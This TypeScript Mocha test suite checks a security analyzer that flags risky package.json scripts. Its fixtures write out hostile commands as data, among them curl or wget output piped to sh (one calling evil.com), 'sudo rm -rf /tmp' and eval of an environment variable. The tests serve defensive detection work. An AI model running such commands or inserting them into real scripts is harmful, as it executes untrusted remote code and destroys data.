import * as assert from 'node:assert';
import { suite, test } from 'mocha';
import { createScriptAnalyzer } from '../../analyzers/scriptAnalyzer';
import { FINDING_TAGS } from '../../types';
import type { AnalysisContext } from '../../analyzers/types';
import type { PackageJson } from '../../types';

suite('ScriptAnalyzer Test Suite', () => {
	const createContext = (packageJson: PackageJson): AnalysisContext => ({
		packageJson,
		allDependencies: {},
		dependencyRanges: {},
		workspacePath: '/test',
	});

	suite('Dangerous Commands Detection', () => {
		test('should detect rm -rf command', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					clean: 'rm -rf dist',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('rm -rf'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'error');
				assert.ok(findings[0].message.includes('clean'));
				assert.ok(findings[0].tags?.includes(FINDING_TAGS.SECURITY));
				assert.ok(findings[0].tags?.includes(FINDING_TAGS.SCRIPTS));
			}
		});

		test('should detect sudo command', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					install: 'sudo npm install -g my-package',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) => f.message.includes('sudo'));
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'error');
			}
		});

		test('should detect eval command', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					dynamic: 'node -e "eval(process.env.CODE)"',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('eval()'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'warning');
			}
		});

		test('should detect output suppression', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					silent: 'npm run build > /dev/null 2>&1',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('Output suppression'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'info');
			}
		});

		test('should detect curl piped to shell', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					setup: 'curl https://example.com/install.sh | sh',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter(
					(f) => f.message.includes('curl') && f.message.includes('shell'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'error');
			}
		});

		test('should detect wget piped to shell', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					setup: 'wget -O- https://example.com/install.sh | sh',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter(
					(f) => f.message.includes('wget') && f.message.includes('shell'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'error');
			}
		});

		test('should detect multiple dangerous commands', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					danger1: 'rm -rf node_modules',
					danger2: 'sudo rm -rf /tmp',
					danger3: 'curl http://evil.com | sh',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const errorFindings = result.data.filter((f) => f.type === 'error');
				assert.ok(errorFindings.length >= 3);
			}
		});
	});

	suite('Inefficiency Patterns Detection', () => {
		test('should detect npm install in scripts', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					setup: 'npm install && npm run build',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('npm install'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'info');
				assert.ok(findings[0].tags?.includes(FINDING_TAGS.PERFORMANCE));
			}
		});

		test('should not flag npm install with flags', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					setup: 'npm install --production',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('npm install'),
				);
				assert.strictEqual(findings.length, 0);
			}
		});

		test('should detect sequential script execution', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					all: 'npm run lint && npm run test && npm run build',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('Sequential script execution'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'info');
			}
		});
	});

	suite('Test Script Detection', () => {
		test('should flag missing test script', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					build: 'tsc',
					start: 'node dist/index.js',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('No "test" script'),
				);
				assert.strictEqual(findings.length, 1);
				assert.strictEqual(findings[0].type, 'info');
				assert.ok(findings[0].tags?.includes(FINDING_TAGS.QUALITY));
			}
		});

		test('should flag placeholder test script with echo error', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					test: 'echo "Error: no test specified"',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('placeholder'),
				);
				assert.strictEqual(findings.length, 1);
			}
		});

		test('should flag placeholder test script with exit 1', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					test: 'exit 1',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('placeholder'),
				);
				assert.strictEqual(findings.length, 1);
			}
		});

		test('should not flag valid test script', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					test: 'jest --coverage',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.toLowerCase().includes('test'),
				);
				assert.strictEqual(findings.length, 0);
			}
		});

		test('should handle case-insensitive placeholder detection', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					test: 'ECHO "ERROR: NO TEST SPECIFIED"',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const findings = result.data.filter((f) =>
					f.message.includes('placeholder'),
				);
				assert.strictEqual(findings.length, 1);
			}
		});
	});

	suite('Edge Cases', () => {
		test('should handle missing scripts field', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				assert.strictEqual(result.data.length, 0);
			}
		});

		test('should handle empty scripts object', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				assert.strictEqual(result.data.length, 0);
			}
		});

		test('should handle safe scripts with no issues', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					build: 'tsc',
					test: 'jest',
					lint: 'eslint src',
					start: 'node dist/index.js',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				assert.strictEqual(result.data.length, 0);
			}
		});

		test('should include script metadata in findings', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					danger: 'rm -rf dist',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const dangerousFindings = result.data.filter((f) =>
					f.message.includes('rm -rf'),
				);
				assert.ok(dangerousFindings.length > 0);
				const finding = dangerousFindings[0];
				assert.ok(finding.meta);
				const meta = finding.meta as Record<string, unknown>;
				assert.strictEqual(meta.script, 'danger');
				assert.strictEqual(meta.content, 'rm -rf dist');
			}
		});

		test('should handle complex multi-line-like scripts', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					complex: 'tsc && node dist/index.js && echo "Done"',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
		});

		test('should detect multiple issues in single script', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					bad: 'sudo rm -rf /tmp && eval(code)',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				assert.ok(result.data.length >= 2);
			}
		});
	});

	suite('Script Content Analysis', () => {
		test('should analyze all scripts in package', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					script1: 'safe command',
					script2: 'rm -rf temp',
					script3: 'another safe',
					script4: 'sudo install',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
			if (result.success) {
				const dangerousFindings = result.data.filter((f) => f.type === 'error');
				assert.strictEqual(dangerousFindings.length, 2);
			}
		});

		test('should handle scripts with special characters', async () => {
			const analyzer = createScriptAnalyzer();
			const context = createContext({
				scripts: {
					build: 'node -e "console.log(\\"build\\")"',
				},
			});

			const result = await analyzer.analyze(context);

			assert.strictEqual(result.success, true);
		});
	});
});
